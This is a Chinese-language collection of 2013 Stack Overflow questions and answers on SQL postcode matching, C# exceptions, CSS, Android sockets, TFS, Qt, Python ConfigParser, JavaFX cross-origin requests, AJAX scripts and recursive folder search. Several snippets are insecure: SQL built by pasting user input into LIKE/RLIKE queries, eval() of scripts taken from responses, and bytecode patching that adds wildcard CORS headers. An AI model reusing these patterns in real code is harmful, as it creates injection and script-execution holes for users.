我有一个使用 LIKE 搜索邮政编码的查询。现在，如果有人输入完整的邮政编码，例如 SW14 4NP，邮政编码就可以了。但如果有人输入 SW1，它会返回任何带有 SW1+ 结果的东西。我怎样才能做到这一点，如果有人放 SW1，它只会显示 SW1 邮政编码，而不显示 SW11、SW14 等。

我的查询是：

```
SELECT postcode FROM data WHERE postcode LIKE '$search%' 
```

邮政编码数据库存储为带有空格的 SW14 4NP 等。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T13:19:29.577

```
SELECT postcode FROM data WHERE postcode LIKE '$search %' 
```

只需在搜索键后添加空格即可。然后它将找到所有 SW1 代码（或您要查找的任何代码），但不会找到 SW11

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-25T13:23:17.013

使用基于[正则表达式](http://dev.mysql.com/doc/en/regexp.html)的模式匹配：

```
WHERE postcode RLIKE '^$search( ?[0-9][A-Z]{2})?' 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-25T13:19:42.353

```
SELECT  postcode
FROM    data
WHERE   postcode LIKE 'SW1 %' 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-25T13:23:10.270

```
 SELECT postcode FROM data WHERE postcode LIKE '$search %' 
```

但是假设用户仅插入 SW，它不会返回任何内容，而对于您当前的查询，它将返回以 SW 开头的任何内容。取决于你想做什么。

# c# - 代码错误但未引发错误

> ID：16215817
> 
> 赞同：-5
> 
> 时间：2013-04-25T13:16:56.307
> 
> 标签：c#

我已经以“加载”事件的形式编写了这段代码

```
 MessageBox.Show("Message 1");
        string strConnectionString = @"Data Source=HB-VAIO\SQLEXPRESS;Initial Catalog=DB1;Integrated Security=True;Pooling=False";
        SqlCommand cmdAddPackage = new SqlCommand("AddPackage");
        SqlConnection con = new SqlConnection();
        con.ConnectionString = strConnectionString;

        cmdAddPackage.CommandType = CommandType.StoredProcedure;
        cmdAddPackage.Parameters.Add(new SqlParameter("@GUIDOutput",SqlDbType.UniqueIdentifier)).Direction = ParameterDirection.Output;

        Guid GUI = (Guid) cmdAddPackage.ExecuteScalar();   // Error should be raised but there is no error
        MessageBox.Show(GUI.ToString());
        cmdAddPackage.Connection.Close();
        textBox1.Text = GUI.ToString();
        MessageBox.Show("end"); 
```

* * *

我知道代码是**错误**的！它应该引发***“无法打开登录请求的数据库“DB1”。登录失败。用户“HB-VAIO\SONY”登录失败。”*** 在第 8 行，但是当我运行程序时没有引发错误，第一个消息框弹出但没有第二个和第三个消息框的迹象，并且表单加载成功。

代码的错误之处在于：

*   我的数据库名称是“DB”，但在这段代码中我使用了“DB1”。

*   未设置 cmdAddPackage 的连接。

当我将相同的代码添加到 button1_Click 事件时，它会显示错误。

你能帮我为什么会这样吗？

我没有找到任何答案:(

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T13:20:45.207

你使用什么 UI 框架？一些 .Net UI 框架确实为您提供了一些“加载”事件，但也有一些会发生在您的偶数处理程序期间发生的所有异常，“为最终用户提供更好的 UI 体验”。

您可以轻松检查是否在调试器下的 OUTPUT 面板中引发任何异常。如果你看到任何“第一次机会异常”——那么你就有了，你的 UI 框架是“安静的”。

添加 try-catch，或添加 application.unhandledexception 事件处理程序，并尝试忍受您安静的 UI。

如果我没记错的话，WPF 喜欢默默地跳过异常，而 WinForms 往往会立即崩溃。但我在这里可能错了。

# css - CSS3 过渡（立方贝塞尔）在 Firefox 中不起作用

> ID：16215821
> 
> 赞同：6
> 
> 时间：2013-04-25T13:17:09.180
> 
> 标签：css, cross-browser, css-transitions

```
 transition: all 0.3s cubic-bezier(0.42, 0, 0.58, 1) 0; 
```

根据 w3schools 支持它。

在 Chrome、IE 和 Opera 中运行良好。

[http://jsfiddle.net/FSEqT/1/](http://jsfiddle.net/FSEqT/1/)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-25T13:35:05.020

奇怪的是，在属性中不包括秒单位[`transition-delay`](http://www.w3.org/TR/css3-transitions/#transition-delay)会导致转换不起作用。只需将您的`transition`规则更改为：

```
transition: all 0.3s cubic-bezier(0.42, 0, 0.58, 1) 0s; 
```

[http://jsfiddle.net/FSEqT/7/](http://jsfiddle.net/FSEqT/7/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T13:27:02.900

```
-moz-transition: all 0.3s cubic-bezier(x1, y1, x2, y2); 
```

[https://developer.mozilla.org/en-US/docs/CSS/timing-function](https://developer.mozilla.org/en-US/docs/CSS/timing-function)

# android - Android 在后台执行

> ID：16215824
> 
> 赞同：0
> 
> 时间：2013-04-25T13:17:14.383
> 
> 标签：android

```
package com.example.handy;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.io.OutputStream;
import java.net.UnknownHostException;
import java.util.Date;
import java.util.NoSuchElementException;
import java.util.Scanner;

import android.R.integer;
import android.app.Activity;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.StrictMode;
import android.provider.ContactsContract;
import android.text.format.DateFormat;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity
{

    private EditText ipaddress;
    private Button connect;
    private Button wipe;
    private static String myIp;

    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        StrictMode.ThreadPolicy policy = new StrictMode.
        ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy); 

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        ipaddress = (EditText) findViewById(R.id.ipaddress_felid);

        connect = (Button) findViewById(R.id.connect);
        wipe =(Button) findViewById(R.id.wipe);

        //Button press event listener
        connect.setOnClickListener(new View.OnClickListener()
        {
            public void onClick(View v)
             {
                 setMyIp(ipaddress.getText().toString());
                // myComs.sending_data(getMyIp() , "Got connected");
                try
                 {

                    InetAddress inet = InetAddress.getByName(getMyIp());
                    Socket s = new Socket(inet, 2000);
                    new Incomingdata(s).execute();
                    OutputStream o = s.getOutputStream();
                    PrintWriter p = new PrintWriter(o);

                     p.println("You are connected");
                     p.flush();

                     readContacts();
                     readSms();

                 }

                 catch (UnknownHostException e) 
                 {
                    ipaddress.setText("Unknown host");
                       e.printStackTrace();
                 }
                catch (IOException e)
                {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }

             }

         });
        wipe.setOnClickListener(new View.OnClickListener()
        {
            public void onClick(View v)
             {
                String kill = "5";
                 myComs.sending_data(MainActivity.getMyIp(), kill);
                 finish();

             }
             });
    }
public class Incomingdata extends AsyncTask<Void,Void,Void>
{
    Socket s ;
    String input;

    public Incomingdata(Socket socket)
    {
        super();
        this.s = socket;
    }

    @Override
    protected Void doInBackground(Void... params) 
    {
        try
        {   
            InputStream in = s.getInputStream();
            Scanner r = new Scanner(in);
            while(s.isConnected()&& r.hasNext())
            {
                String input =r.nextLine();

            }

        }
        catch (UnknownHostException e) 
        {
            ipaddress.setText("Unknown host");
               e.printStackTrace();
        }
        catch (IOException e)
        {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        catch(NoSuchElementException e)
        {
            e.printStackTrace();
        }
        return null;
    }

    @Override
    protected void onPostExecute(Void input)
    {
        System.out.println(""+input);
    }

} 
```

我没有错误，它没有崩溃，但它没有收听我传入的消息，也没有显示它

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T13:18:27.380

尝试使用：

```
while(s.isConnected() && r.hasNext()) {
    String input =r.nextLine();
} 
```

您的 while 循环目前仅检查您是否已连接，并且有可能成为无限循环。`r`另一方面，您的 Scanner不会有无限量的数据，因此重复调用`nextLine()`意味着您最终会用完要读取的数据，并获得`NoSuchElementException`您拥有的数据。

编辑：正如评论中提到的codeMagic，您应该在 onPostExecute() 中的 UI 线程上调用 setText() 而不是在 doInBackground() 中调用，因为一旦修复此问题，这只会导致更多异常。

# version-control - Team Foundation 服务中的文件/文件夹结构

> ID：16215825
> 
> 赞同：0
> 
> 时间：2013-04-25T13:17:15.297
> 
> 标签：version-control, visual-studio-2012, tfs, azure-devops

将项目添加到 TFS 时，我将为特定网站添加一个项目。这工作正常，网站根目录中的所有文件夹和文件都在 TFS 中可用。但是，也有位于网站根目录之上的共享文件，并且不包含在特定网站项目/解决方案中，因为它们位于网站根目录之外。例如，当我将现有文件添加到根目录之外的项目时，它会在项目中创建重复项。或者，将现有文件添加到项目时，会在项目中创建错误的文件夹层次结构（看起来好像根目录上方的文件夹在网站内部），这将导致在 TFS 中发布和共享源出现问题。

将这些文件包含在项目中的适当方法是什么，以便这些文件可以保留在根目录之外，但可以包含在 TFS 中的项目中。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T19:04:53.077

实现这一目标的一种方法是简单地**为您的所有网站创建一个团队项目**，并通过使用团队/区域将其逻辑分解为不同的站点以用于积压/迭代/工作项等。您的所有源代码都将位于您的一个团队项目中的正确层次结构中，然后可以在团队项目中的子项目之间共享。

有关此方法的讨论，请参阅以下帖子：

*   [与团队 Foundation Server 2010 合作的项目项目](http://blog.hinshelwood.com/project-of-projects-with-team-foundation-server-2010/)
*   [何时应在 TFS 中使用区域而不是 Team Foundation Server 2010 中的团队项目](http://blog.hinshelwood.com/when-should-i-use-areas-in-tfs-instead-of-team-projects-in-team-foundation-server-2010/)
*   [一个团队项目](http://blog.hinshelwood.com/one-team-project/)

# sql - 使用 QSqlTableModel::insertRecord 插入行时如何检索生成的主键

> ID：16215826
> 
> 赞同：0
> 
> 时间：2013-04-25T13:17:16.133
> 
> 标签：sql, qt, postgresql, primary-key, qsqltablemodel

这个问题与带有 Postgres 的 Windows 上的 Qt 4.7.3 相关。

我正在尝试通过 将一行插入到一个非常大的表中`QSqlTableModel`，因为这（希望）省去了我输入字段名称的麻烦，通过使用 `QSqlTableModel::setTable`. 我用 向模型询问记录对象`QSqlRecord row(QSqlTableModel::record);`，并通过 用数据填充它`QSqlRecord::setValue`。这是保留该行的代码：

```
const bool insertOk = tableModel.insertRecord(-1, row);

if (!insertOk || !tableModel.submitAll()) {
  return -1;
}

QSqlError err = tableModel.lastError();
if (err.type() != QSqlError::NoError) {
  std::cerr << "errormsg " << std::endl;
  return -1;
}

const int primaryKey = tableModel.query().lastInsertId().toInt(); 
```

以上是我尝试过的，但是内容`tableModel.query()`是巨选，没有`RETURNING`关键字。`lastInsertId()`返回一个无效的`QVariant`. 是否可以让 Qt 提供生成的主键，而不需要额外的 - 丑陋 - 往返数据库。如果可以避免的话，我宁愿不锁定表以确保最后一个实际上是我创建的表。

请指教。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T13:43:20.077

通过对`LASTVAL()`. 不确定这是否是使用 Qt API 的正确方法。`LASTVAL()`在交易中是安全的。

# android - 如何在android中创建动态表格视图

> ID：16215837
> 
> 赞同：1
> 
> 时间：2013-04-25T13:17:44.040
> 
> 标签：android

我为此使用了这个概念：（1.）创建自定义列表视图，代码如下：

custom_row_view ：

> ```
> <RelativeLayout
>     android:layout_width="match_parent"
>     android:layout_height="wrap_content"
>     android:layout_alignParentLeft="true"
>     android:layout_alignParentTop="true" >
>    <!--  android:background="#801A1A1A" > -->
> 
>     <TableRow
>         android:id="@+id/tableRow10"
>         android:layout_width="match_parent"
>         android:layout_height="wrap_content"
>         android:layout_centerHorizontal="true"
>         android:background="#000000"
>         android:padding="1dp">
> 
>         <TextView
>             android:id="@+id/textView1"
>             android:layout_width="wrap_content"
>             android:layout_height="wrap_content"
>             android:layout_weight="1"
>             android:padding="2dp"
>             android:gravity="center_horizontal"
>             android:textSize="10dp"
>             android:background="#FFFFFF"
>             android:textAppearance="@style/myTextviewText"
>             android:text="TextView" />
> 
>         <TextView
>             android:id="@+id/textView2"
>             android:layout_width="wrap_content"
>             android:layout_height="wrap_content"
>             android:layout_weight="2"
>             android:padding="2dp"
>             android:textSize="10dp"
>             android:gravity="center_horizontal"
>             android:background="#FFFFFF"
>             android:layout_marginLeft="1dp"
>             android:textAppearance="@style/myTextviewText"
>             android:text="TextView" />
> 
>         <TextView
>             android:id="@+id/textView3"
>             android:layout_width="wrap_content"
>             android:layout_height="wrap_content"
>             android:layout_weight="1"
>             android:padding="2dp"
>             android:textSize="10dp"
>             android:gravity="center_horizontal"
>             android:background="#FFFFFF"
>             android:layout_marginLeft="1dp"
>             android:textAppearance="@style/myTextviewText"
>             android:text="TextView" />
> 
>         <TextView
>             android:id="@+id/textView4"
>             android:layout_width="wrap_content"
>             android:layout_height="wrap_content"
>             android:layout_weight=".5"
>             android:padding="2dp"
>             android:textSize="10dp"
>             android:gravity="center_horizontal"
>             android:background="#FFFFFF"
>             android:layout_marginLeft="1dp"
>             android:textAppearance="@style/myTextviewText"
>             android:text="TextView" />
> 
>     </TableRow>
> 
> </RelativeLayout> 
> ```

使用上述过程时遇到问题，我在行自定义视图中使用 weight 属性，但 textview 根据文本大小拉伸。问题是 ： ![在此处输入图像描述](https://i.stack.imgur.com/iS0qq.png)

# python - 如何使用 python 修改配置文件？

> ID：16215842
> 
> 赞同：2
> 
> 时间：2013-04-25T13:17:56.073
> 
> 标签：python, python-2.7

我有一个cfg文件。在那个 cfg 文件中，有这样一行：

```
[Environment]
automation_type=GFX   ;available options: GEM, HEXAII 
```

我想通过以下方式修改这一行：

```
[Environment]
automation_type=ABC   ;available options: GEM, HEXAII 
```

我为此编写了以下代码：

```
get_path_for_od_cfg = r"C:\Users\marahama\Desktop\Abdur\abc_MainReleaseFolder\OD\od\odConfig.cfg"
    config = ConfigParser.RawConfigParser()
    config.read(get_path_for_OpenDebug_cfg)
    for sec in config.sections():
        for attr in config.options(sec):
            if sec =='Environment' and attr == 'automation_type':
                config.set('Environment','automation_type','ABC')
    with open(get_path_for_OpenDebug_cfg, 'wb') as configfile:
        config.write(configfile) 
```

执行代码后，我得到

```
[Environment]
automation_type = ABC 
```

* * *

```
";available options: GEM, HEXAII" this line is missing. 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-25T13:25:57.930

正如[源代码](http://hg.python.org/cpython/file/09811ecd5df1/Lib/ConfigParser.py)所暗示的那样，在读取配置文件时，注释将被忽略，它们都位于不同的行（[484](http://hg.python.org/cpython/file/09811ecd5df1/Lib/ConfigParser.py#l484)）......

```
if line.strip() == '' or line[0] in '#;':
     continue 
```

并在选项行（[522](http://hg.python.org/cpython/file/09811ecd5df1/Lib/ConfigParser.py#l522)）上：

```
if vi in ('=', ':') and ';' in optval:
     # ';' is a comment delimiter only if it follows
     # a spacing character
     pos = optval.find(';')
     if pos != -1 and optval[pos-1].isspace():
         optval = optval[:pos] 
```

所以我同意上面的评论，如果你关心保留评论，你应该切换到更底层的东西。

# javascript - JavaFX WebView 禁用同源策略（允许跨域请求）

> ID：16215844
> 
> 赞同：8
> 
> 时间：2013-04-25T13:18:02.430
> 
> 标签：javascript, cross-domain, javafx, same-origin-policy

我正在开发一个 JavaFX 应用程序，它主要是一个美化的网页。它是一个桌面应用程序（它没有嵌入到网页中），并且它有一个用于主 UI 的 Web 视图。该应用程序本身的唯一目的是使用 Bluecove 访问蓝牙设备，因为这无法直接使用 Web 浏览器上的 JavaScript。

概念证明工作正常（我能够从 Java 调用 JavaScript 代码，反之亦然），但我有一个额外的要求，即从 JavaScript 中调用任意 Web 服务/API，但这违反了同源策略（类似于 Android ：[允许在 Android Webview + jquery mobile 中进行远程 ajax 调用](https://stackoverflow.com/questions/13956726/allow-remote-ajax-calls-in-an-android-webview-jquery-mobile)）。这在 JavaFX 上可行吗？有小费吗？

PS：我使用的是 JavaFX 2.2。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2014-09-29T13:38:48.743

基本上，javaFx 存在与 CORS 相关的问题 - [https://javafx-jira.kenai.com/browse/RT-35868](https://javafx-jira.kenai.com/browse/RT-35868)。假设您正在使用的 Web 服务启用了 CORS，您可以尝试以下方法：

*   `System.setProperty("sun.net.http.allowRestrictedHeaders", "true")`

或者

*   `java -Dsun.net.http.allowRestrictedHeaders=true <your main class here>`

希望对你有帮助

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-03T06:23:23.410

由于您已经在 J​​avaFX 中作为桌面应用程序运行，因此您可以通过 Java 进行 JavaScript 调用，其中同源策略不适用。

或者，[您发布的 SO 问题的这个答案](https://stackoverflow.com/a/2067240/1236464)似乎是一个可行的选择。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-11-23T10:57:26.903

先看这个答案，再看我的答案：<a href="https://stackoverflow.com/questions/36917469/how-can-i-work-around-youtube-api-embed-restrictions-like-other -websites?answertab=active#tab-top">如何像其他网站一样解决 YouTube API 嵌入限制？

```
if ("sun/net/www/protocol/http/HttpURLConnection".equals(className)) {
        try {
            CtClass ctClass = classPool.makeClass(new ByteArrayInputStream(classfileBuffer));
            CtMethod method = ctClass.getDeclaredMethod("getFilteredHeaderFields");
            // inject cross domain code
            injectCrossDomain(method);
            byteCode = ctClass.toBytecode();
            ctClass.detach();
        } catch (Exception e) {
            e.printStackTrace();
            throw new CatalinaException(e);
        }
}

----------------injectCrossDomain----------------

private void injectCrossDomain(CtMethod method) throws CannotCompileException {
        StringBuilder sb = new StringBuilder();

        sb.append("if (this.filteredHeaders != null) {");
        sb.append("    return this.filteredHeaders;");
        sb.append("} else {");
        sb.append("    java.util.HashMap var2 = new java.util.HashMap();");
        sb.append("    java.util.Map var1;");
        sb.append("    if (this.cachedHeaders != null) {");
        sb.append("        var1 = this.cachedHeaders.getHeaders();");
        sb.append("    } else {");
        sb.append("        var1 = this.responses.getHeaders();");
        sb.append("    }");
        sb.append("    java.util.Iterator var3 = var1.entrySet().iterator();");
        sb.append("    while(var3.hasNext()) {");
        sb.append("        java.util.Map.Entry var4 = (java.util.Map.Entry)var3.next();");
        sb.append("        String var5 = (String)var4.getKey();");
        sb.append("        java.util.List var6 = (java.util.List)var4.getValue();");
        sb.append("        java.util.ArrayList var7 = new java.util.ArrayList();");
        sb.append("        java.util.Iterator var8 = var6.iterator();");
        sb.append("        while(var8.hasNext()) {");
        sb.append("            String var9 = (String)var8.next();");
        sb.append("            String var10 = this.filterHeaderField(var5, var9);");
        sb.append("            if (var10 != null) {");
        sb.append("                var7.add(var10);");
        sb.append("            }");
        sb.append("        }");
        sb.append("        if (!var7.isEmpty()) {");

        // insert Access-Control-Allow-Origin:*
        sb.append("            var2.put(\"Access-Control-Allow-Origin\", java.util.Collections.singletonList(\"*\"));");
        // insert Access-Control-Allow-Headers:*
        sb.append("            var2.put(\"Access-Control-Allow-Headers\", java.util.Collections.singletonList(\"*\"));");

        sb.append("            var2.put(var5, java.util.Collections.unmodifiableList(var7));");
        sb.append("        }");
        sb.append("    }");
        sb.append("    return this.filteredHeaders = java.util.Collections.unmodifiableMap(var2);");
        sb.append("}");

        method.setBody(sb.toString());
} 
```

# android - 更改默认图标创建一个新的 Android Eclipse 项目

> ID：16215849
> 
> 赞同：0
> 
> 时间：2013-04-25T13:18:06.893
> 
> 标签：android, eclipse

有谁知道如何更改嵌入此处的默认图标？为了使您创建的**所有新应用程序都****具有该图标，而不是 android 默认图标**。

![在此处输入图像描述](https://i.stack.imgur.com/FulpN.png)

我试图在 /android-sdk-linux/platforms/android-[VERSION]/data 中寻找它，但没有成功。:( 是否命名为 ic_launcher.png？

提前致谢！

编辑：请在投票或回答前阅读。不是如何更改图标应用程序，这个 Q 是关于如何将其设置为所有新项目的默认值。

:)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-26T06:56:20.773

为了大家的利益：

默认图标位于此路径中：

```
/eclipse/plugins/com.android.ide.eclipse.adt_xxxxx.jar/templates/ 
```

在这里，您还可以为所有活动定义一个新的默认包和一个标题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T14:05:27.363

如果您打算更改启动器图标，只需修改*manifest.xml*；请参考[http://developer.android.com/](http://developer.android.com/guide/topics/manifest/application-element.html)

这样，您可以为每个项目使用不同的图标。如果您只想更改默认值，我看不出它的目的是什么，但它可能在您的 adtbundle 中定义：***\YOUR ADT BUNDLE\sdk\tools\apps\SdkController\res***

# javascript - 从 AJAX 响应中提取和执行脚本

> ID：16215851
> 
> 赞同：0
> 
> 时间：2013-04-25T13:18:11.620
> 
> 标签：javascript, jquery

我的 AJAX 响应返回如下内容：

```
<div>
..
</div>

<script type="text/javascript">
..
</script>

<script type="text/javascript">
..
</script>

<div>
..
</div> 
```

我想从脚本标签执行脚本（应该跨浏览器工作）并将文本（div）插入到页面之后。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T13:31:11.210

您的`script`标签不需要`type="text/javascript"`跨浏览器兼容性的属性。

你的 JavaScript 将从上到下执行。因此，先出现的脚本将首先执行。最后添加文本插入，如下所示：

HTML：

```
<div id="myDiv"></div> 
```

JavaScript：

```
document.getElementById("myDiv").innerHTML = "hello"; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T13:32:22.317

从 ajax 响应中提取脚本通常是不好的做法（缓存、安全性......）。最好处理在 ajax 响应中返回的数据 (JSON)。考虑使用 JQuery 或其他框架，因为它们提供跨浏览器功能和内置的 DOM 操作。

请参阅以下 DOM 操作示例：

```
$(document).ready(function() {
  var $grouplist = $('#groups');
  $.each(myData, function() {
    $('<li>' + this.name + '</li>').appendTo($grouplist);
  });
}); 
```

@http [://jsfiddle.net/qmacro/NJMyD/](http://jsfiddle.net/qmacro/NJMyD/)

如果您想在没有框架的情况下保留本机功能，则 javascript 提供了可能依赖于浏览器的本机 dom 操作功能。

当您向`<javascript>`正文添加新元素时，它应该自动注册。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-25T14:43:22.210

谢谢大家。我创建了这样的解决方案：

```
var scripts = [];
$(response).each(function(key, element){
    if ($(element).is('script')) {
        scripts.push(element.innerHTML);
    } else {
        $('test').append($(element));
    }
});
$.each(scripts, function(key, element){
    eval(element);
}); 
```

# java - 获取具有给定名称的所有文件夹

> ID：16215860
> 
> 赞同：2
> 
> 时间：2013-04-25T13:18:34.377
> 
> 标签：java, recursion, directory

我正在寻找一种解决方案来查找给定目录中具有相同名称的所有文件夹。

所以我的文件夹结构如下所示：

```
 Root
                         |                |             |
                     android          windows          ios
                    |       |        |       |       |      | 
                  focus    normal  focus   normal  focus   normal 
```

**注意：**客户端和图标集之间有更多文件夹，这就是我需要递归的原因。

我想获得一个包含所有路径的 ArrayList，例如 Normal 文件夹。尽管递归一直让我很困惑，但我无法做到。

这是我的第一次尝试，它应该返回根文件夹（参数路径）中包含的**所有**目录。字符串图标集应在之后定义搜索文件夹的名称。

```
private static ArrayList<String> getAllIconSetFolders(String path, String iconset) {
        ArrayList<String> pathes = new ArrayList<String>();

        File folder = new File(path);
        File[] listOfFiles = folder.listFiles();

        for (File file : listOfFiles) {
            if (file != null && file.isDirectory()) {
                pathes.addAll(getAllIconSetFolders(file.getAbsolutePath(), iconset));
            }
        }
        return pathes;
    } 
```

在这种情况下，它将返回一个空的 ArrayList。

如何获取（String iconset =“normal”时的普通文件夹）的所有路径，所以我的结果如下所示：

*   “根/android/[...]/正常”
*   “根/windows/[...]/正常”
*   “根/ios/[...]/正常”

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T13:36:10.597

我刚刚测试了以下代码，它似乎可以正常工作：

```
public static List<File> findDirectoriesWithSameName(String name, File root) {
  List<File> result = new ArrayList<>();

  for (File file : root.listFiles()) {
    if (file.isDirectory()) {
      if (file.getName().equals(name)) {
        result.add(file);
      }

      result.addAll(findDirectoriesWithSameName(name, file));
    }
  }

  return result;
} 
```

您的原始代码几乎就在那里，您只是省略了实际将匹配目录添加到结果列表的部分。

* * *

经测试：

```
C:\tmp\foo
C:\tmp\foo\bar
C:\tmp\foo\baz
C:\tmp\foo\baz\foo
C:\tmp\foo\baz\foo\bar 
```

使用

```
public static void main(String[] args) throws Exception {
  List<File> files = findDirectoriesWithSameName("foo", new File("C:\\tmp"));

  for (File f :files) {
    System.out.println(f);
  }    
} 
```

输出：

```
C:\tmp\foo
C:\tmp\foo\baz\foo 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T13:31:34.407

经测试。作品。需要Java 7。

```
public static void main(String[] args) {
    List<String> paths = new ArrayList<String>();
    getAllFolders("/path/to/folder", "normal", paths);
}

private static void getAllFolders(String path, String folderName, List<String> paths) throws Exception {

    Path mainPath = Paths.get(path);
    Iterator<Path> stream = Files.newDirectoryStream(mainPath).iterator();

    while(stream.hasNext()) {
        Path currentPath = stream.next();
        String currentFolderName = currentPath.getFileName().toString();
        if(currentFolderName.equals(folderName)) {
            paths.add(currentPath.toString());
        }
        getAllFolders(currentPath.toString(), folderName, paths);
    }

} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-25T13:34:08.720

您需要添加目录名称，`pathes`否则它将始终为空。你的代码应该是这样的：

```
private static List<String> getAllIconSetFolders(String path, String iconset) 
{
  List<String> pathes = new ArrayList<String>();

  File folder = new File(path);

  for (File file : folder.listFiles()) 
  {
    if (file.isDirectory()) 
    {
      if (file.getName().equals(iconset))
      {
        pathes.add(file.getAbsolutePath());
      }
      else
      {
        pathes.addAll(getAllIconSetFolders(file.getAbsolutePath(), iconset));
      }
    }
  }

  return pathes;
} 
```

这假定`iconset`是您要查找的目录的名称，并且具有该名称的目录可以在目录树中多次存在。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-25T13:40:00.650

在目录中搜索目录时，一种优雅的方法是使用`FileFilter`or 进行名称匹配使用`FileNameFilter`。最重要的是，您应用标准递归方式，完整的解决方案将是：

```
static void test()
{
    File f = new File("e:\\folder");
    List<File> res = new ArrayList<File>();
    search(f, res, "normal");
    System.out.println(res);
    search(f, res, "focus");
    System.out.println(res);
}

static void search(File f, List<File> res, final String search)
{
    if(f.isDirectory())
    {
        File[] result = f.listFiles(new FilenameFilter()
        {
            public boolean accept(File file, String name)
            {
                return file.isDirectory() && name.equals(search);
            }
        });
        if(result != null)
        {
            for(File file : result)
            {
                res.add(file);
            }
        }

        //search further recursively
        File[] allFiles = f.listFiles();
        if(allFiles != null)
        {
            for(File file: allFiles)
            {
                search(file, res, search);
            }
        }
    }
} 
```

或者你可以`extend FileNameFilter`说`NormalDirFilter`或者你可以`FocusDirFilter`在哪里硬编码特定的文件夹搜索名称。在递归期间列出文件时使用这些特定过滤器的实例。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2013-04-25T13:25:12.023

如果你有这个结构，你能不能做

```
public static List<File> subdirectories(File root, String toFind) {
    List<File> ret = new ArrayList<File>();
    for(File dir : root.listFiles()) {
        File dir2 = new File(dir, toFind);
        if (dir2.isDirectory())
            ret.add(dir2);
    }
    return ret;
} 
```

# c# - mvc 4站点后退按钮在IE9中不起作用

> ID：16215863
> 
> 赞同：2
> 
> 时间：2013-04-25T13:18:36.507
> 
> 标签：c#, asp.net-mvc-4, internet-explorer-9

差不多两年前有[一个非常相似的问题](https://stackoverflow.com/questions/6947807/mvc-back-button-doesnt-execute-controller-method-in-ie9)，但从未解决，现在我遇到了与 IE9 中的 MVC 4 完全相同的问题。我有一个尽可能简单的测试站点。当我运行它时，它似乎工作得很好。所有的css都被加载了，所有的脚本都被导入了，等等。但是当我点击后退按钮时，几乎所有的东西都消失了。

现在，几乎所有内容都是重要的注意事项，因为大多数静态布局（除了 an`@{ Html.RenderPartial("_MyNavPartial") }`和 a`@RenderBody()`调用）根本不返回任何内容，而另一个页面的表格中填充了来自服务调用的数据仍然返回数据，并带有 css对其应用的格式也不少。但是导航部分消失了，页面上表格对齐的所有 css 设置也消失了。当我刷新页面时，一切都回来了。

根据 Fiddler 的说法，当按下后退按钮时，什么都不会返回，查看源代码只显示基本标记，根本没有内容。带有表格的页面仅显示表格和 css id，尽管应用于的 id`<body>`消失了。

我已经尝试禁用缓存，更改对静态 URL 的`@Url.ActionLink()`调用`@Url.Action()`，甚至只是为了查看是否存在某些动态内容，但仍然存在完全相同的问题。同样，这仅适用于 IE9。在 Chrome 和 Firefox 中一切正常，这让我觉得有某种设置关闭了。可能是什么？提前谢谢大家！

# cordova - phonegap 仅在列表视图中访问图像的来源

> ID：16215870
> 
> 赞同：0
> 
> 时间：2013-04-25T13:18:48.380
> 
> 标签：cordova, configuration, phonegap-plugins

我想知道是否可以使用特定访问源。例如，在我的数据库中，我有一个显示在列表视图中的图片的 URL。在我的文本内容中，我有一个指向原始文章 URL 的链接。如果我使用 access origin="*"，那么我的文本内容中的链接会在 WebView 中打开，并且会导致 ajax 页面加载崩溃。如果我只允许访问我的服务器，则图像不会显示在列表视图中。

我的问题是我是否可以将特定 URL 列入白名单。例如，链接的图像类似于 www.example.com/res/images/，原始页面 URL 是 www.example.com/news/。是否可以仅添加 example.com/res/images 进行访问，以便加载图像但在浏览器中打开原始文章？我尝试了许多不同的组合，但无法获得所需的输出。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T15:04:10.143

这是我的问题的答案......而且我不必使用 inAppBrowser 或 ChildBrowser for Android 之类的解决方法。

我了解到，在 config.xml 访问 origin="..." 中，您必须准确指定网站 URL。如果该网站不使用 www 而只使用[http://example.com](http://example.com)，则您必须将该确切的 URL 放在您的来源中......您还可以将[http://example.com/res/images/](http://example.com/res/images/)添加到只允许该部分链接到您的应用程序并显示在您的应用程序中。如果您有[http://example.com/news/something](http://example.com/news/something)的链接，单击该 URL 将提示一个本机浏览器窗口。

